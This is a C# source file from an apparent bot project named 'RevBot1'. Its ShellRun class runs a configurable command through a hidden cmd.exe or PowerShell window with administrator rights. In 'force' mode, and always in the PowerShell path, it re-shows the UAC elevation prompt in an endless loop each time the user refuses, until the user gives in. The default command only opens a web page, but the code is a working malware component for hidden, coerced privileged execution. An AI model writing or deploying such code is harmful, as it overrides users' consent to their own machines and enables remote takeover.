using System;
using System.Diagnostics;


namespace RevBot1
{
    internal class ShellRun
    {
        public static string command = "start https://google.com";
        public static string access = "force";
        public static string type = "cmd";

        public static void Run()
        {
        if(type == "cmd")
            {
            RunCMD();
        }
        else if(type == "powershell")
            {
            RunPWS();
        }


        }
        public static void RunCMD()
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    Verb = "runas", // Always execute with administrator privileges
                    WindowStyle = ProcessWindowStyle.Hidden // Hide the command prompt window
                };

                Console.WriteLine($"Trying to run CMD command as administrator...");

                if (access == "force")
                {
                    bool executed = false;
                    while (!executed)
                    {
                        try
                        {
                            using (Process process = Process.Start(startInfo))
                            {
                                if (process != null)
                                {
                                    process.WaitForExit();
                                    if (process.ExitCode == 0) // Exit code 0 indicates successful completion
                                    {
                                        Console.WriteLine("CMD command executed successfully as administrator.");
                                        executed = true; // Set flag to exit loop
                                    }
                                    else
                                    {
                                        Console.WriteLine($"CMD command failed to execute as administrator. Exit code: {process.ExitCode}");
                                    }
                                }
                                else
                                {
                                    Console.WriteLine("Failed to start CMD process.");
                                }
                            }
                        }
                        catch (System.ComponentModel.Win32Exception ex)
                        {
                            // This exception is thrown when the user refuses the UAC prompt
                            Console.WriteLine("User refused UAC prompt. Retrying...");
                        }
                    }
                }
                else
                {
                    Process.Start(startInfo);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error running CMD command: " + ex.Message);
            }
        }

        public static void RunPWS()
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-WindowStyle Hidden -Command \"{command}\"",
                    Verb = "runas",  // Execute with administrator privileges
                    WindowStyle = ProcessWindowStyle.Hidden // Hide the PowerShell window
                };

                while (true)
                {
                    try
                    {
                        Console.WriteLine("Trying to run PowerShell command as administrator...");
                        Process process = Process.Start(startInfo);
                        process.WaitForExit();

                        if (process.ExitCode == 0) // Exit code 0 indicates successful completion
                        {
                            Console.WriteLine("PowerShell command executed successfully as administrator.");
                            break; // Break the loop if the command executed successfully
                        }
                        else
                        {
                            Console.WriteLine("PowerShell command failed to execute as administrator. Retrying...");
                        }
                    }
                    catch (System.ComponentModel.Win32Exception ex)
                    {
                        // This exception is thrown when the user refuses the UAC prompt
                        Console.WriteLine("User refused UAC prompt. Retrying...");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error running PowerShell command: " + ex.Message);
            }
        }


    }
}






